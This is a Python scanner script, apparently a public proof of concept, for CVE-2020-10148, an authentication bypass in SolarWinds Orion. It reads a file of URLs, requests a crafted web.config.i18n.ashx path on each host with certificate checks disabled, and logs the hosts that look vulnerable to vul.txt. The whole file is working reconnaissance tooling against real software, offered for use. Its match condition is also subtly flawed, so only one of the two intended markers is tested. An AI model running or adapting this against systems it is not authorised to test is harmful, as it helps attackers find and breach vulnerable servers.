#!/usr/bin/python
# -*- coding:utf-8

import requests,sys,colorama
from colorama import *
init(autoreset=True)



def verify():
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
    payload= '/web.config.i18n.ashx?l=en-US&v=B1anda0' #v值可自定义，不可为空
    poc=urls+payload
    try:
        requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
        response=requests.get(poc,headers=headers,timeout=15,verify=False)
        if response.status_code==200 and "SolarWinds.Orion.Core.Common" and "/Orion/NetPerfMon/TemplateSiblingIconUrl" in response.content:
            print(u'\033[1;31;40m[+]{} Yes'.format(urls))
            #将漏洞地址输出在Vul.txt中
            f=open('./vul.txt','a')
            f.write(urls)
            f.write('\n')
        else:
            print('\033[1;32;40m[-]{} None'.format(urls))
    except:
        print('{} 请求超时'.format(urls))


if __name__ == '__main__':
    if len(sys.argv)!=2:
        print('用法:python CVE-2020-10148.py urls.txt')
    else:
        file = open(sys.argv[1])
        for url in file.readlines():
            urls=url.strip()
            if urls[-1]=='/':
                urls=urls[:-1]
            verify()
        print ('\033[1;33;40m检测完毕！')